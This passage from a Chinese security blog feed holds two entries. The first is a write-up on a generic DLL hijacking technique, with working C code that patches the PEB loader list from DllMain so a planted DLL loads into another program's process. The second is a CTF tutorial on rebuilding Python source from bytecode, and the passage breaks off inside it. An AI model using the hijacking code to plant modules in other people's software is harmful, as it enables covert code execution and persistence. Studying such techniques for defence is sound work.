[Non-Fpo])</span><br><span class="line">07 0025ee38 761b3c12 00000000 00000000 00000001 KERNELBASE!LoadLibraryExW+0x15a (FPO: [Non-Fpo])</span><br><span class="line">08 0025ee4c 6848e3f5 0025ee58 003a0043 0055005c kernel32!LoadLibraryW+0x11 (FPO: [Non-Fpo])</span><br><span class="line">09 0025f068 6848d1de d9131536 00000000 00000000 test!start+0x2b5</span><br><span class="line">0a 0025f09c 6848e245 013a0000 761b3c26 76b3ea5f test!start+0x21e86e</span><br><span class="line">0b 0025f328 013a1918 013a0000 0037187a 00000000 test!start+0x105</span><br><span class="line">0c 0025fb44 013a30b9 013a0000 00000000 0037187a test+0x1918</span><br><span class="line">0d 0025fb90 761b3c45 7ffd9000 0025fbdc 77d937f5 test+0x30b9</span><br><span class="line">0e 0025fb9c 77d937f5 7ffd9000 74e93b01 00000000 kernel32!BaseThreadInitThunk+0xe (FPO: [Non-Fpo])</span><br><span class="line">0f 0025fbdc 77d937c8 013a312b 7ffd9000 00000000 ntdll!__RtlUserThreadStart+0x70 (FPO: [Non-Fpo])</span><br><span class="line">10 0025fbf4 00000000 013a312b 7ffd9000 00000000 ntdll!_RtlUserThreadStart+0x1b (FPO: [Non-Fpo])</span><br></pre></td></tr></table></figure> <p>先去reactos翻看一下，找到如下的函数调用结构。在LdrLoadDll参数中BaseAddress就是最后返回给LoadLibraryW的值，所以继续看BaseAddress是如何赋值的。BaseAddress继续传给LdrpLoadDll，在LdrpLoadDll中，首先通过LdrpMapDll映射dll模块，返回一个LdrEntry的LDR_DATA_TABLE_ENTRY结构，保存了dll加载的基址、大小、名字等信息。接着LdrEntry会插入到peb-&gt;ldr链表结构中，然后调用LdrpRunInitializeRoutines，在LdrpRunInitializeRoutines中最终会调用DllMain，此处不继续深入分析。最后LdrEntry-&gt;DllBase赋值给BaseAddress。到此流程分析清楚，下面考虑如何修改这个值。</p> <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line">NTSTATUS</span><br><span class="line">NTAPI</span><br><span class="line">LdrLoadDll(IN PWSTR SearchPath OPTIONAL,</span><br><span class="line">           IN PULONG DllCharacteristics OPTIONAL,</span><br><span class="line">           IN PUNICODE_STRING DllName,</span><br><span class="line">           OUT PVOID *BaseAddress) &#123;</span><br><span class="line">               Status = LdrpLoadDll(RedirectedDll,</span><br><span class="line">                         SearchPath,</span><br><span class="line">                         DllCharacteristics,</span><br><span class="line">                         DllName,</span><br><span class="line">                         BaseAddress,</span><br><span class="line">                         TRUE);</span><br><span class="line">           &#125;</span><br><span class="line"></span><br><span class="line">NTSTATUS</span><br><span class="line">NTAPI</span><br><span class="line">LdrpLoadDll(IN BOOLEAN Redirected,</span><br><span class="line">            IN PWSTR DllPath OPTIONAL,</span><br><span class="line">            IN PULONG DllCharacteristics OPTIONAL,</span><br><span class="line">            IN PUNICODE_STRING DllName,</span><br><span class="line">            OUT PVOID *BaseAddress,</span><br><span class="line">            IN BOOLEAN CallInit)</span><br><span class="line">            &#123;</span><br><span class="line">                Status = LdrpMapDll(DllPath,</span><br><span class="line">                            DllPath,</span><br><span class="line">                            NameBuffer,</span><br><span class="line">                            DllCharacteristics,</span><br><span class="line">                            FALSE,</span><br><span class="line">                            Redirected,</span><br><span class="line">                            &amp;LdrEntry);</span><br><span class="line"></span><br><span class="line">                 //插入peb-&gt;ldr链表</span><br><span class="line"></span><br><span class="line">                Status = LdrpRunInitializeRoutines(NULL);</span><br><span class="line"></span><br><span class="line">                if (NT_SUCCESS(Status))</span><br><span class="line">                &#123;</span><br><span class="line">                    /* Return the base address */</span><br><span class="line">                    *BaseAddress = LdrEntry-&gt;DllBase;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;    </span><br><span class="line"></span><br><span class="line">LdrpRunInitializeRoutines-&gt; LdrpCallInitRoutine -&gt; DllMain</span><br></pre></td></tr></table></figure> <p>记得映像中的那种方法，是通过堆栈回溯到LdrpLoadDll中，找到LdrEntry进行修改（不确实是否准备，时间久远了），但因为LdrEntry是局部变量，不同系统可以不一样，兼容性差一些。但看到这个调用流程之后，其实还有另一种方式。LdrEntry-&gt;DllBase赋值给BaseAddress，那么在赋值之前把这个LdrEntry-&gt;DllBase修改了即可，在DllMain正好是修改的时机，但是不需要使用堆栈回溯的方式。因为LdrEntry已经插入到peb-&gt;ldr中，那么在DllMain中可以直接获取peb-&gt;ldr遍历链表找到目标dll堆栈的LdrEntry就是需要修改的LdrEntry，然后修改即可。</p> <p>不过这个分析都是基于reactos来的，还是需要确认一下真是windows系统的ntdll是如何首先的。</p> <p>在win7 x64系统中，ntdll的关键代码如下所示。差别是LdrpLoadDll直接返回的ldrentry，而不是BaseAddress，在LdrpLoadDll内部流程基本和reactos一致。所以方案应该可行，后续验证确实证明可行。</p> <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">int __fastcall LdrLoadDll()</span><br><span class="line">&#123;</span><br><span class="line">v11 = LdrpLoadDll(v5, v9, v10, 1, 0i64, &amp;dataentry);</span><br><span class="line">  v12 = v11;</span><br><span class="line">  if ( v11 &gt;= 0 )</span><br><span class="line">    *dllbase = dataentry-&gt;DllBase;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure> <h2 id="尝试实现"><a href="#尝试实现" class="headerlink" title="尝试实现"></a>尝试实现</h2><p>实现其实非常简单，关键代码如下所示。两部分代码，一个是加载原始dll模块（mydll.dll.1）拿到真是的模块句柄hMod（基地址），第二个就是遍历peb-&gt;ldr找到mydll.dll的ldrentry，然后修改dllbase为hMod。</p> <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line">void* NtCurrentPeb()</span><br><span class="line">&#123;</span><br><span class="line"> __asm &#123;</span><br><span class="line">  mov eax, fs:[0x30];</span><br><span class="line"> &#125;</span><br><span class="line">&#125;</span><br><span class="line">PEB_LDR_DATA* NtGetPebLdr(void* peb)</span><br><span class="line">&#123;</span><br><span class="line"> __asm &#123;</span><br><span class="line">  mov eax, peb;</span><br><span class="line">  mov eax, [eax + 0xc];</span><br><span class="line"> &#125;</span><br><span class="line">&#125;</span><br><span class="line">VOID SuperDllHijack(LPCWSTR dllname, HMODULE hMod)</span><br><span class="line">&#123;</span><br><span class="line"> WCHAR wszDllName[100] = &#123; 0 &#125;;</span><br><span class="line"> void* peb = NtCurrentPeb();</span><br><span class="line"> PEB_LDR_DATA* ldr = NtGetPebLdr(peb);</span><br><span class="line"></span><br><span class="line"> for (LIST_ENTRY* entry = ldr-&gt;InLoadOrderModuleList.Blink;</span><br><span class="line">  entry != (LIST_ENTRY*)(&amp;ldr-&gt;InLoadOrderModuleList);</span><br><span class="line">  entry = entry-&gt;Blink) &#123;</span><br><span class="line">  PLDR_DATA_TABLE_ENTRY data = (PLDR_DATA_TABLE_ENTRY)entry;</span><br><span class="line"></span><br><span class="line">  memset(wszDllName, 0, 100 * 2);</span><br><span class="line">  memcpy(wszDllName, data-&gt;BaseDllName.Buffer, data-&gt;BaseDllName.Length);</span><br><span class="line"></span><br><span class="line">  if (!_wcsicmp(wszDllName, dllname)) &#123;</span><br><span class="line">   data-&gt;DllBase = hMod;</span><br><span class="line">   break;</span><br><span class="line">  &#125;</span><br><span class="line"> &#125;</span><br><span class="line">&#125;</span><br><span class="line">VOID DllHijack(HMODULE hMod)</span><br><span class="line">&#123;</span><br><span class="line"> TCHAR tszDllPath[MAX_PATH] = &#123; 0 &#125;;</span><br><span class="line"></span><br><span class="line"> GetModuleFileName(hMod, tszDllPath, MAX_PATH);</span><br><span class="line"> PathRemoveFileSpec(tszDllPath);</span><br><span class="line"> PathAppend(tszDllPath, TEXT(&quot;mydll.dll.1&quot;));</span><br><span class="line"></span><br><span class="line"> HMODULE hMod1 = LoadLibrary(tszDllPath);</span><br><span class="line"></span><br><span class="line"> SuperDllHijack(L&quot;mydll.dll&quot;, hMod1);</span><br><span class="line">&#125;</span><br><span class="line">BOOL APIENTRY DllMain( HMODULE hModule,</span><br><span class="line">                       DWORD  ul_reason_for_call,</span><br><span class="line">                       LPVOID lpReserved</span><br><span class="line">                     )</span><br><span class="line">&#123;</span><br><span class="line">    switch (ul_reason_for_call)</span><br><span class="line">    &#123;</span><br><span class="line">    case DLL_PROCESS_ATTACH:</span><br><span class="line">        DllHijack(hModule);</span><br><span class="line">        break;</span><br><span class="line">    case DLL_THREAD_ATTACH:</span><br><span class="line">    case DLL_THREAD_DETACH:</span><br><span class="line">    case DLL_PROCESS_DETACH:</span><br><span class="line">        break;</span><br><span class="line">    &#125;</span><br><span class="line">    return TRUE;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure> <h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>经测试在win7 x84和win10 x64中即是有效的，其他系统未测试，如果有问题，请留言或自行解决。</p> <p>害怕这种方案不行，还想了另一种思路，在dllmain中hook LdrpLoadDll的返回调用地址处，修改dataentry的值，因为LdrLoadDll函数接口固定，所以这种方式也应该是通用的，不过实现起来其实还比现在的麻烦些，所以只是保留了这种思路，并未去实现验证，留给爱折腾的朋友吧。</p> <p>最后，代码上传了github，<a href="https://github.com/anhkgg/SuperDllHijack" target="_blank" rel="noopener">https://github.com/anhkgg/SuperDllHijack</a></p> <p>转载请注明出处：<a href="https://anhkgg.com/dllhijack/" target="_blank" rel="noopener">https://anhkgg.com/dllhijack/</a></p> <p>公众号文章链接：<a href="https://mp.weixin.qq.com/s/Nx4C2mx94V9vhvU8Eqfobg" target="_blank" rel="noopener">https://mp.weixin.qq.com/s/Nx4C2mx94V9vhvU8Eqfobg</a></p> <p>欢迎关注公众号：<strong>汉客儿</strong>或加入QQ交流群：<strong>753894145</strong></p> ]]></content>          <summary type="html">            &lt;p&gt;欢迎关注技术公众号：&lt;strong&gt;&lt;span style=&quot;color:red&quot;&gt;汉客儿&lt;/span&gt;&lt;/strong&gt;&lt;br&gt;&lt;img src=&quot;/img/wx.png&quot; alt=&quot;img&quot;&gt;&lt;/p&gt; &lt;blockquote&gt; &lt;p&gt;通用DLL劫持技术研究&lt;br&gt;&lt;br&gt;by anhkgg&lt;br&gt;&lt;br&gt;2018年11月29日&lt;br&gt;&lt;/p&gt; &lt;/blockquote&gt; &lt;h2 id=&quot;写在前面&quot;&gt;&lt;a href=&quot;#写在前面&quot; class=&quot;headerlink&quot; title=&quot;写在前面&quot;&gt;&lt;/a&gt;写在前面&lt;/h2&gt;&lt;p&gt;Dll劫持相信大家都不陌生，理论就不多说了。Dll劫持的目的一般都是为了自己的dll模块能够在别人进程中运行，然后做些不可描述的事情。&lt;/p&gt; &lt;p&gt;为了让别人的程序能够正常运行，通常都需要在自己的dll中导出和劫持的目标dll相同的函数接口，然后在自己的接口函数中调用原始dll的函数，如此使得原始dll的功能能够正常被使用。导出接口可以自己手工写，也可以通过工具自动生成，比如著名的&lt;code&gt;Aheadlib&lt;/code&gt;。这种方法的缺点就是针对不同的dll需要导出不同的接口，虽然有工具帮助，但也有限制，比如不支持x64。&lt;/p&gt;          </summary>            <category term="security" scheme="https://anhkgg.github.io/categories/security/"/>                 <category term="dllhijack" scheme="https://anhkgg.github.io/tags/dllhijack/"/>            <category term="windows" scheme="https://anhkgg.github.io/tags/windows/"/>        </entry>      <entry>     <title>死磕python字节码-手工还原python源码（网鼎杯第四场逆向题chaoyang）</title>     <link href="https://anhkgg.github.io/python-bytecode/"/>     <id>https://anhkgg.github.io/python-bytecode/</id>     <published>2018-09-04T15:21:29.000Z</published>     <updated>2018-09-04T15:29:08.761Z</updated>          <content type="html"><![CDATA[<h2 id="0x1-前言"><a href="#0x1-前言" class="headerlink" title="0x1.前言"></a>0x1.前言</h2><blockquote> <p>Python 代码先被编译为字节码后，再由Python虚拟机来执行字节码， Python的字节码是一种类似汇编指令的中间语言， 一个Python语句会对应若干字节码指令，虚拟机一条一条执行字节码指令， 从而完成程序执行。<br>Python dis 模块支持对Python代码进行反汇编， 生成字节码指令。</p> </blockquote> <a id="more"></a> <p><code>dis.dis()</code>将CPython字节码转为可读的伪代码(类似于汇编代码)。结构如下：</p> <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">7           0 LOAD_CONST               1 (0)</span><br><span class="line">            3 STORE_FAST               1 (local1)</span><br><span class="line"></span><br><span class="line">8           6 LOAD_CONST               2 (101)</span><br><span class="line">            9 STORE_GLOBAL             0 (global1)</span><br><span class="line"></span><br><span class="line">9          12 LOAD_FAST                1 (local1)</span><br><span class="line">           15 PRINT_ITEM</span><br><span class="line">           16 LOAD_FAST                0 (arg1)</span><br><span class="line">           19 PRINT_ITEM</span><br><span class="line">           20 LOAD_GLOBAL              0 (global1)</span><br><span class="line">           23 PRINT_ITEM</span><br><span class="line">           24 PRINT_NEWLINE</span><br><span class="line">           25 LOAD_CONST               0 (None)</span><br><span class="line">           28 RETURN_VALUE</span><br></pre></td></tr></table></figure> <p>其实就是这样的结构：</p> <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">源码行号 | 指令在函数中的偏移 | 指令符号 | 指令参数 | 实际参数值</span><br></pre></td></tr></table></figure> <h2 id="0x2-变量"><a href="#0x2-变量" class="headerlink" title="0x2.变量"></a>0x2.变量</h2><h3 id="1-const"><a href="#1-const" class="headerlink" title="1.const"></a>1.const</h3><p><code>LOAD_CONST</code>加载<code>const</code>变量，比如数值、字符串等等，一般用于传给函数的参数</p> <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">55       12 LOAD_GLOBAL              1 (test)</span><br><span class="line">         15 LOAD_FAST                0 (2) #读取2</span><br><span class="line">         18 LOAD_CONST               1 (&apos;output&apos;) </span><br><span class="line">         21 CALL_FUNCTION            2</span><br></pre></td></tr></table></figure> <p>转为python代码就是：</p> <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">test(2, &apos;output&apos;)</span><br></pre></td></tr></table></figure> <h3 id="2-局部变量"><a href="#2-局部变量" class="headerlink" title="2.局部变量"></a>2.局部变量</h3><p><code>LOAD_FAST</code>一般加载局部变量的值，也就是读取值，用于计算或者函数调用传参等。<br><code>STORE_FAST</code>一般用于保存值到局部变量。</p> <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">61          77 LOAD_FAST                0 (n)</span><br><span class="line">             80 LOAD_FAST                3 (p)</span><br><span class="line">             83 INPLACE_DIVIDE</span><br><span class="line">             84 STORE_FAST               0 (n)</span><br></pre></td></tr></table></figure> <p>这段bytecode转为python就是：</p> <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">n = n / p</span><br></pre></td></tr></table></figure> <p>函数的形参也是局部变量，如何区分出是函数形参还是其他局部变量呢？</p> <p>形参没有初始化，也就是从函数开始到<code>LOAD_FAST</code>该变量的位置，如果没有看到<code>STORE_FAST</code>，那么该变量就是函数形参。</p> <p>而其他局部变量在使用之前肯定会使用<code>STORE_FAST</code>进行初始化。</p> <p>具体看下面的实例：</p> <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">4           0 LOAD_CONST               1 (0)</span><br><span class="line">            3 STORE_FAST               1 (local1)</span><br><span class="line"></span><br><span class="line">5           6 LOAD_FAST                1 (local1)</span><br><span class="line">            9 PRINT_ITEM</span><br><span class="line">           10 LOAD_FAST                0 (arg1)</span><br><span class="line">           13 PRINT_ITEM</span><br><span class="line">           14 PRINT_NEWLINE</span><br><span class="line">           15 LOAD_CONST               0 (None)</span><br><span class="line">           18 RETURN_VALUE</span><br></pre></td></tr></table></figure> <p>对应的python代码如下，对比一下就一目了然。</p> <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">def test(arg1):</span><br><span class="line">    local1 = 0</span><br><span class="line">    print local1, arg1</span><br></pre></td></tr></table></figure> <h3 id="3-全局变量"><a href="#3-全局变量" class="headerlink" title="3.全局变量"></a>3.全局变量</h3><p><code>LOAD_GLOBAL</code>用来加载全局变量，包括指定函数名，类名，模块名等全局符号。</p> <p><code>STORE_GLOBAL</code>用来给全局变量赋值。</p> <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">8           6 LOAD_CONST               2 (101)</span><br><span class="line">            9 STORE_GLOBAL             0 (global1)</span><br><span class="line">            20 LOAD_GLOBAL              0 (global1)</span><br><span class="line">            23 PRINT_ITEM</span><br></pre></td></tr></table></figure> <p>对应的python代码</p> <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">def test():</span><br><span class="line">    global global1</span><br><span class="line">    global1 = 101</span><br><span class="line">    print global</span><br></pre></td></tr></table></figure> <h2 id="0x3-常用数据类型"><a href="#0x3-常用数据类型" class="headerlink" title="0x3.常用数据类型"></a>0x3.常用数据类型</h2><h3 id="1-list"><a href="#1-list" class="headerlink" title="1.list"></a>1.list</h3><p><code>BUILD_LIST</code>用于创建一个list结构。</p> <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">13           0 LOAD_CONST               1 (1)</span><br><span class="line">             3 LOAD_CONST               2 (2)</span><br><span class="line">             6 BUILD_LIST               2</span><br><span class="line">             9 STORE_FAST               0 (k)</span><br></pre></td></tr></table></figure> <p>对应python代码是：</p> <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">k = [1, 2]</span><br></pre></td></tr></table></figure> <p>另外再看看一种常见的创建list的方式如下：</p> <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[x for x in xlist if x!=0 ]</span><br></pre></td></tr></table></figure> <p>一个实例bytecode如下：</p> <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">22         235 BUILD_LIST               0 //创建list，为赋值给某变量，这种时候一般都是语法糖结构了</span><br><span class="line">           238 LOAD_FAST                3 (sieve)</span><br><span class="line">           241 GET_ITER</span><br><span class="line">       &gt;&gt;  242 FOR_ITER                24 (to 269)</span><br><span class="line">           245 STORE_FAST               4 (x)</span><br><span class="line">           248 LOAD_FAST                4 (x)</span><br><span class="line">           251 LOAD_CONST               2 (0)</span><br><span class="line">           254 COMPARE_OP               3 (!=)</span><br><span class="line">           257 POP_JUMP_IF_FALSE      242 //不满足条件contine</span><br><span class="line">           260 LOAD_FAST                4 (x)//读取满足条件的x</span><br><span class="line">           263 LIST_APPEND              2 //把每个满足条件的x存入list</span><br><span class="line">           266 JUMP_ABSOLUTE          242</span><br><span class="line">       &gt;&gt;  269 RETURN_VALUE</span><br></pre></td></tr></table></figure> <p>转为python代码是：</p> <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[for x in sieve if x != 0]</span><br></pre></td></tr></table></figure> <h3 id="2-dict"><a href="#2-dict" class="headerlink" title="2.dict"></a>2.dict</h3><p><code>BUILD_MAP</code>用于创建一个空的dict。<code>STORE_MAP</code>用于初始化dict的内容。</p> <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">13           0 BUILD_MAP                1</span><br><span class="line">             3 LOAD_CONST               1 (1)</span><br><span class="line">             6 LOAD_CONST               2 (&apos;a&apos;)</span><br><span class="line">             9 STORE_MAP</span><br><span class="line">            10 STORE_FAST               0 (k)</span><br></pre></td></tr></table></figure> <p>对应的python代码是：</p> <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">k = &#123;&apos;a&apos;: 1&#125;</span><br></pre></td></tr></table></figure> <p>再看看修改dict的bytecode：</p> <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">14          13 LOAD_CONST               3 (2)</span><br><span class="line">             16 LOAD_FAST                0 (k)</span><br><span class="line">             19 LOAD_CONST               4 (&apos;b&apos;)</span><br><span class="line">             22 STORE_SUBSCR</span><br></pre></td></tr></table></figure> <p>对应的python代码是：</p> <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">k[&apos;b&apos;] = 2</span><br></pre></td></tr></table></figure> <h3 id="3-slice"><a href="#3-slice" class="headerlink" title="3.slice"></a>3.slice</h3><p><code>BUILD_SLICE</code>用于创建slice。对于list、元组、字符串都可以使用slice的方式进行访问。</p> <p>但是要注意<code>BUILD_SLICE</code>用于[x:y:z]这种类型的slice，结合<code>BINARY_SUBSCR</code>读取slice的值，结合<code>STORE_SUBSCR</code>用于修改slice的值。</p> <p>另外<code>SLICE+n</code>用于[a:b]类型的访问，<code>STORE_SLICE+n</code>用于[a:b]类型的修改，其中<code>n</code>表示如下：</p> <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">SLICE+0()</span><br><span class="line">Implements TOS = TOS[:].</span><br><span class="line"></span><br><span class="line">SLICE+1()</span><br><span class="line">Implements TOS = TOS1[TOS:].</span><br><span class="line"></span><br><span class="line">SLICE+2()</span><br><span class="line">Implements TOS = TOS1[:TOS].</span><br><span class="line"></span><br><span class="line">SLICE+3()</span><br><span class="line">Implements TOS = TOS2[TOS1:TOS].</span><br></pre></td></tr></table></figure> <p>下面看具体实例：</p> <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">13           0 LOAD_CONST               1 (1)</span><br><span class="line">              3 LOAD_CONST               2 (2)</span><br><span class="line">              6 LOAD_CONST               3 (3)</span><br><span class="line">              9 BUILD_LIST               3</span><br><span class="line">             12 STORE_FAST               0 (k1) //k1 = [1, 2, 3]</span><br><span class="line"></span><br><span class="line"> 14          15 LOAD_CONST               4 (10)</span><br><span class="line">             18 BUILD_LIST               1</span><br><span class="line">             21 LOAD_FAST                0 (k1)</span><br><span class="line">             24 LOAD_CONST               5 (0)</span><br><span class="line">             27 LOAD_CONST               1 (1)</span><br><span class="line">             30 LOAD_CONST               1 (1)</span><br><span class="line">             33 BUILD_SLICE              3</span><br><span class="line">             36 STORE_SUBSCR                    //k1[0:1:1] = [10]</span><br><span class="line"></span><br><span class="line"> 15          37 LOAD_CONST               6 (11)</span><br><span class="line">             40 BUILD_LIST               1</span><br><span class="line">             43 LOAD_FAST                0 (k1)</span><br><span class="line">             46 LOAD_CONST               1 (1)</span><br><span class="line">             49 LOAD_CONST               2 (2)</span><br><span class="line">             52 STORE_SLICE+3                   //k1[1:2] = [11]</span><br><span class="line"></span><br><span class="line"> 16          53 LOAD_FAST                0 (k1)</span><br><span class="line">             56 LOAD_CONST               1 (1)</span><br><span class="line">             59 LOAD_CONST               2 (2)</span><br><span class="line">             62 SLICE+3</span><br><span class="line">             63 STORE_FAST               1 (a)  //a = k1[1:2]</span><br><span class="line"></span><br><span class="line"> 17          66 LOAD_FAST                0 (k1)</span><br><span class="line">             69 LOAD_CONST               5 (0)</span><br><span class="line">             72 LOAD_CONST               1 (1)</span><br><span class="line">             75 LOAD_CONST               1 (1)</span><br><span class="line">             78 BUILD_SLICE              3</span><br><span class="line">             81 BINARY_SUBSCR</span><br><span class="line">             82 STORE_FAST               2 (b) //b = k1[0:1:1]</span><br></pre></td></tr></table></figure> <h2 id="0x4-循环"><a href="#0x4-循环" class="headerlink" title="0x4.循环"></a>0x4.循环</h2><p><code>SETUP_LOOP</code>用于开始一个循环。<code>SETUP_LOOP              26 (to 35)</code>中<code>35</code>表示循环退出点。</p> <h3 id="while循环"><a href="#while循环" class="headerlink" title="while循环"></a>while循环</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">23           0 LOAD_CONST               1 (0)</span><br><span class="line">             3 STORE_FAST               0 (i) // i=0</span><br><span class="line"></span><br><span class="line">24           6 SETUP_LOOP              26 (to 35)</span><br><span class="line">       &gt;&gt;    9 LOAD_FAST                0 (i) //循环起点</span><br><span class="line">            12 LOAD_CONST               2 (10)</span><br><span class="line">            15 COMPARE_OP               0 (&lt;)</span><br><span class="line">            18 POP_JUMP_IF_FALSE       34     //while i &lt; 10:</span><br><span class="line"></span><br><span class="line">25          21 LOAD_FAST                0 